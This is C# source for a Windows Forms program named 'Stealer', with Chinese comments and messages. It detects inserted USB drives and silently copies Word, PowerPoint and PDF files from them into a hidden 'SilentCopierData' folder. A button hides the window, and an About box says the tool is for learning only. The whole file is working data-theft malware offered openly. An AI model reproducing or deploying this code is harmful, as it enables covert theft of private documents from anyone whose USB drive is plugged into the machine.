using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.IO;
using System.Windows.Forms;

namespace Stealer
{
	public partial class Stealer : Form
	{
		public const int WM_DEVICECHANGE = 0x219;
		public const int DBT_DEVICEARRIVAL = 0x8000;
		public const int DBT_CONFIGCHANGECANCELED = 0x0019;
		public const int DBT_CONFIGCHANGED = 0x0018;
		public const int DBT_CUSTOMEVENT = 0x8006;
		public const int DBT_DEVICEQUERYREMOVE = 0x8001;
		public const int DBT_DEVICEQUERYREMOVEFAILED = 0x8002;
		public const int DBT_DEVICEREMOVECOMPLETE = 0x8004;
		public const int DBT_DEVICEREMOVEPENDING = 0x8003;
		public const int DBT_DEVICETYPESPECIFIC = 0x8005;
		public const int DBT_DEVNODES_CHANGED = 0x0007;
		public const int DBT_QUERYCHANGECONFIG = 0x0017;
		public const int DBT_USERDEFINED = 0xFFFF;

		private static int USB = 0;

		private string fPath = @"D:\";
		private HashSet<string> fPathList;
		private string fName = "SilentCopierData";
		private string[] fExtension = { "doc", "docx", "ppt", "pptx", "pdf" };
		private List<string> driveList;

		public Stealer()
		{
			fPathList = new HashSet<string>();
			driveList = new List<string>();

			fPathList.Add(fPath);

			InitializeComponent();
		}

		/// <summary>
		/// 窗口载入
		/// </summary>
		/// <param name="sender"></param>
		/// <param name="e"></param>
		private void Form1_Load(object sender, EventArgs e)
		{
			RefreshInfo();

			foreach (string s in fExtension)
			{
				txtFileExtension.AppendText(s + ",");
			}

			txtFileExtension.Text = txtFileExtension.Text.Substring(0, txtFileExtension.Text.Length - 1);
		}

		/// <summary>
		/// U盘插拔检测
		/// </summary>
		/// <param name="m"></param>
		protected override void WndProc(ref Message m)
		{
			try
			{
				if (m.Msg == WM_DEVICECHANGE)
				{
					switch (m.WParam.ToInt32())
					{
						//U盘插入
						case DBT_DEVICEARRIVAL: 
							DriveInfo[] s = DriveInfo.GetDrives();
							foreach (DriveInfo drive in s)
							{
								if (drive.DriveType == DriveType.Removable)
								{
									bool same = false;

									foreach (string d in driveList)
									{
										if (d.Equals(drive.VolumeLabel))
										{
											same = true;
											break;
										}
									}

									if (!same)
									{
										driveList.Add(drive.VolumeLabel);
										txtMain.Text = "检测到插入的U盘" + drive.Name + "\n";

										foreach (string path in fPathList)
										{
											string p = Path.Combine(path, fName);
											CopyFile copyFile = new CopyFile(drive.Name, Path.Combine(p, "USB" + (++USB)), fName, fExtension);
											txtMain.AppendText(copyFile.Copy());
										}
									}
									else
									{
										txtMain.Text = "检测到插入的U盘" + drive.Name + "\n";
										txtMain.AppendText("该U盘内容已拷贝" + "\n");
									}
								}
							}

							break;

						//U盘拔出
						case DBT_DEVICEREMOVECOMPLETE:
							txtMain.Text = "U盘已拔出\n";
							break;

						default:
							break;
					}
				}
			}
			catch
			{
				
			}

			base.WndProc(ref m);
		}

		private void btnHide_Click(object sender, EventArgs e)
		{
			Hide();
		}

		private void btnAbout_Click(object sender, EventArgs e)
		{
			MessageBox.Show("该软件仅用于学习用途，禁止用于其它用途\n作者不承担使用者所触犯的任何法律责任\nMade by Vin","关于");
		}

		private void checkFileExtension_CheckedChanged(object sender, EventArgs e)
		{
			if (checkFileExtension.Checked.Equals(true))
			{
				fExtension = txtFileExtension.Text.Split(',');

				txtFileExtension.ReadOnly = true;
			}
			else
			{
				txtFileExtension.ReadOnly = false;
			}
		}

		private void checkFileName_CheckedChanged(object sender, EventArgs e)
		{
			if (checkFileName.Checked.Equals(true))
			{
				fName = txtFileName.Text;

				txtFileName.ReadOnly = true;
			}
			else
			{
				txtFileName.ReadOnly = false;
			}
		}

		private void btnBrowser_Click(object sender, EventArgs e)
		{
			FolderBrowserDialog dialog = new FolderBrowserDialog();

			//打开的文件夹浏览对话框上的描述  
			dialog.Description = "请选择一个目录";

			//设置此次默认目录为上一次选中目录  
			dialog.SelectedPath = fPath;

			//按下确定选择的按钮  
			if (dialog.ShowDialog() == DialogResult.OK)
			{
				//记录选中的目录  
				fPath = dialog.SelectedPath;
				RefreshInfo();
			}
		}

		private void RefreshInfo()
		{
			txtPath.Text = fPath;
			txtFileName.Text = fName;

			txtPathList.Clear();
			foreach (string path in fPathList)
			{
				txtPathList.AppendText(path + "\n");
			}
		}

		private void btnAddPath_Click(object sender, EventArgs e)
		{
			fPathList.Add(txtPath.Text);

			RefreshInfo();
		}

		private void btnClearPath_Click(object sender, EventArgs e)
		{
			fPathList.Clear();

			RefreshInfo();
		}

		private void btnDelPath_Click(object sender, EventArgs e)
		{
			if(!fPathList.Count.Equals(0))
				fPathList.Remove(fPathList.Last());

			RefreshInfo();
		}
	}
}
